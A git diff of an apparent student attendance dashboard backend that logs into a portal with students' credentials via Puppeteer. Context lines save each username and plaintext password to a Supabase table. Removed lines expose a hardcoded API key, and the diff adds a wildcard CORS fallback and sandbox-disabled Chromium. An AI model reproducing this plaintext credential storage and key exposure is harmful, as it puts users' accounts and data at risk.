@@ -5,16 +5,20 @@ const { createClient } = require("@supabase/supabase-js");
 const { launchBrowser, login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");
 
 const app = express();
-app.use(cors({ origin: "https://attendancedashboar.vercel.app" }));
+
+// --- CORS ---
+// Use environment variable for frontend origin
+app.use(cors({ origin: process.env.FRONTEND_URL || "*" }));
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // --- Supabase setup ---
-const supabaseUrl = "https://ywsqpuvraddaimlbiuds.supabase.co";
-const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3c3FwdXZyYWRkYWltbGJpdWRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MjMzMDgsImV4cCI6MjA3NjM5OTMwOH0.UqkzzWM7nRvgtNdvRy63LLN-UGv-zeYYx6tRYD5zxdY"; // Keep service key private
+// Use environment variables for security
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_KEY;
 const supabase = createClient(supabaseUrl, supabaseKey);
 
-// --- Route: fetch sequentially ---
+// --- Route: fetch attendance sequentially ---
 app.post("/get-attendance", async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password)
@@ -22,7 +26,12 @@ app.post("/get-attendance", async (req, res) => {
 
   let browser, page;
   try {
-    ({ browser, page } = await launchBrowser());
+    // Puppeteer launch with cloud-friendly flags
+    ({ browser, page } = await launchBrowser({
+      headless: true,
+      args: ['--no-sandbox', '--disable-setuid-sandbox']
+    }));
+    
     await login(page, username, password);
 
     // --- Step 1: Academic Attendance ---
@@ -37,13 +46,13 @@ app.post("/get-attendance", async (req, res) => {
 
     const now = new Date().toISOString();
 
-    // --- Save credentials and visit to Supabase ---
+    // --- Save credentials to Supabase ---
     const { error: credError } = await supabase
       .from("student_credentials")
       .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
     if (credError) console.error("Supabase insert error:", credError);
 
-    // --- Record site visit for daily count ---
+    // --- Record site visit ---
     const { error: visitError } = await supabase
       .from("site_visits")
       .insert([{ username, visited_at: now }]);
@@ -80,5 +89,6 @@ app.get("/today-logins", async (req, res) => {
   }
 });
 
-app.listen(process.env.PORT || 3000, () => console.log("Server running ✅"));
-
+// --- Start server ---
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running ✅ on port ${PORT}`));
